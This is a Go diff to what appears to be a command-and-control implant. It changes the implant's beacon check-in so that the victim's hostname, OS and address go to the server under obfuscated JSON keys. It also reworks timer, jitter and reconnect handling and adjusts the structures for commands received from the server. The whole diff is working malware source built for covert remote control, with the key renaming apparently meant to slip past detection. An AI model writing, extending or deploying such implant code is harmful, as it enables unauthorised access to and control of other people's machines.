@@ -124,7 +124,7 @@ func RetryRequest(urlStr string, attempts int, sleepDurationSeconds int) error {
 	logger.Warn(fmt.Sprintf("Retrying request for URL: %s for up to %d attempts.", urlStr, attempts))
 	for count := 0; count < attempts; count++ {
 		logger.Warn(fmt.Sprintf("Retry attempt %d for %s", count+1, urlStr))
-		SleepFor(sleepDurationSeconds)
+		SleepFor(sleepDurationSeconds * count)
 
 		responseCode, _, _, err := GetRequest(urlStr)
 		if err != nil {
@@ -210,13 +210,6 @@ func PostRequest(urlStr string, dataPayload string, compressData bool) (int, str
 	return resp.StatusCode, responseBody, nil
 }
 
-// --- Structs for JSON (de)serialization ---
-type ConnectionRequestData struct {
-	Name    string `json:"name"`
-	OS      string `json:"os"`
-	Address string `json:"address"`
-}
-
 // Updated to use int for Timer and Jitter
 type ConnectionResponseData struct {
 	Timer  int    `json:"timer"`
@@ -224,10 +217,9 @@ type ConnectionResponseData struct {
 	Jitter int    `json:"jitter"`
 }
 
-// httpConnection translates the C++ httpConnection function.
 // Returns: timer, id, jitter, error
 // Updates global currentID, currentTimer, currentJitter on success.
-func HTTPConnection(address string) (int, string, int, error) {
+func HTTPConnection(address string) (float64, string, float64, error) {
 	logger.Log("Starting httpConnection.")
 	hostname, errHost := getHostname()
 	if errHost != nil {
@@ -235,20 +227,28 @@ func HTTPConnection(address string) (int, string, int, error) {
 		hostname = "unknown_hostname"
 	}
 
-	// C++ getIPAddresses() is called but its result isn't directly in requestData.
-	// It might be logged or used elsewhere in the original full application.
-	// getIPAddresses() // Call if needed for logging or other side effects.
-
 	connectURL := GenerateConnectionURL()
 	logger.Log("Connection URL: " + connectURL)
 
-	requestPayload := ConnectionRequestData{
-		Name:    hostname,
-		OS:      config.OsIdentifier,
-		Address: "127.0.0.1", // As per C++ example
-	}
+	keyName := config.Obfuscation.Generic.ImplantInfo.Name
+	logger.Log("Obfuscation key for 'name': " + keyName)
+	keyOS := config.Obfuscation.Generic.ImplantInfo.OS
+	logger.Log("Obfuscation key for 'os': " + keyOS)
+	keyAddr := config.Obfuscation.Generic.ImplantInfo.Address
+	logger.Log("Obfuscation key for 'address': " + keyAddr)
+	valName := hostname
+	valOS := config.OsIdentifier
+	valAddr := config.URL
 
-	jsonDataBytes, err := json.Marshal(requestPayload)
+	// Build dynamic JSON with obfuscated keys
+	payload := map[string]string{
+		keyName: valName,
+		keyOS:   valOS,
+		keyAddr: valAddr,
+	}
+	logger.Log(fmt.Sprintf("Connection payload: %+v", payload))
+
+	jsonDataBytes, err := json.Marshal(payload)
 	if err != nil {
 		logger.Error("Failed to marshal connection request JSON: " + err.Error())
 		return -1, "", -1, fmt.Errorf("failed to marshal connection JSON: %w", err)
@@ -259,7 +259,6 @@ func HTTPConnection(address string) (int, string, int, error) {
 		logger.Error("httpConnection POST request to " + connectURL + " failed: " + postErr.Error())
 		return -1, "", -1, fmt.Errorf("postRequest in httpConnection failed: %w", postErr)
 	}
-	// C++ check `if (response_code == -1)` is covered by `postErr != nil`
 
 	if responseCode != http.StatusOK { // Not 200
 		err := fmt.Errorf("server at %s responded with error in httpConnection: %d %s", connectURL, responseCode, responseBody)
@@ -268,37 +267,38 @@ func HTTPConnection(address string) (int, string, int, error) {
 	}
 
 	logger.Log("httpConnection to " + connectURL + " succeeded. Parsing response...")
-	var parsedResponse ConnectionResponseData
+	var parsedResponse map[string]interface{}
+
 	if err := json.Unmarshal([]byte(responseBody), &parsedResponse); err != nil {
 		logger.Error("JSON parsing failed in httpConnection for response from " + connectURL + ": " + err.Error())
 		return -1, "", -1, fmt.Errorf("failed to parse JSON response from %s: %w. Body: %s", connectURL, err, responseBody)
 	}
 
-	// Removed strconv.Atoi calls; use unmarshaled int values directly.
-	timerVal := parsedResponse.Timer
-	jitterVal := parsedResponse.Jitter
-	idVal := parsedResponse.UUID
+	timerVal := float64(parsedResponse[config.Obfuscation.Generic.ImplantInfo.Timer].(float64))
+	jitterVal := float64(parsedResponse[config.Obfuscation.Generic.ImplantInfo.Jitter].(float64))
+	idVal := string(parsedResponse[config.Obfuscation.Generic.ImplantInfo.UUID].(string))
+
 	if idVal == "" {
 		logger.Error("Received empty 'uuid' in httpConnection response from " + connectURL)
 		return -1, "", -1, fmt.Errorf("empty 'uuid' in response from %s", connectURL)
 	}
 
-	logger.Log(fmt.Sprintf("Parsed connection parameters from %s: timer=%d, uuid=%s, jitter=%d", connectURL, timerVal, idVal, jitterVal))
+	logger.Log(fmt.Sprintf("Parsed connection parameters from %s: timer=%f, uuid=%s, jitter=%f", connectURL, timerVal, idVal, jitterVal))
 	return timerVal, idVal, jitterVal, nil
 }
 
 type ReconnectRequestData struct {
-	Name    string `json:"name"`
-	OS      string `json:"os"`
-	Address string `json:"address"`
-	ID      string `json:"id"`
-	Timer   int    `json:"timer"`
-	Jitter  int    `json:"jitter"`
+	Name    string  `json:"name"`
+	OS      string  `json:"os"`
+	Address string  `json:"address"`
+	ID      string  `json:"id"`
+	Timer   float64 `json:"timer"`
+	Jitter  float64 `json:"jitter"`
 }
 
 // HTTPReconnect connects to the server to update the agent's connection parameters.
 // Returns: statusCode, responseBody, error
-func HTTPReconnect(address string, userID string, jitterVal int, timerVal int) (int, string, error) {
+func HTTPReconnect(address string, userID string, jitterVal float64, timerVal float64) (int, string, error) {
 	// 'address' param from C++ is unused for URL generation, generateReconnectURL() provides it.
 	logger.Log("Starting httpReconnect for user_id: " + userID)
 	hostname, errHost := getHostname()
@@ -315,8 +315,8 @@ func HTTPReconnect(address string, userID string, jitterVal int, timerVal int) (
 		OS:      config.OsIdentifier,
 		Address: "",
 		ID:      config.ID,
-		Timer:   config.Timer,
-		Jitter:  config.Jitter,
+		Timer:   float64(config.Timer),
+		Jitter:  float64(config.Jitter),
 	}
 
 	jsonDataBytes, err := json.Marshal(requestPayload)
@@ -342,15 +342,15 @@ func HTTPReconnect(address string, userID string, jitterVal int, timerVal int) (
 	return responseCode, responseBody, nil
 }
 
-type CommandData struct { // Generic command structure from server
-	Command     string          `json:"command"`
-	CommandUUID string          `json:"command_uuid"`
-	Data        json.RawMessage `json:"data"` // Use RawMessage to delay parsing of 'data'
+type CommandData struct {
+	Command     string
+	CommandUUID string
+	Data        json.RawMessage
 }
 
 type UpdateCommandPayload struct {
-	Timer  int `json:"timer"`
-	Jitter int `json:"jitter"`
+	Timer  float64 `json:"timer"`
+	Jitter float64 `json:"jitter"`
 }
 
 type ServerResponseWithCommands struct {
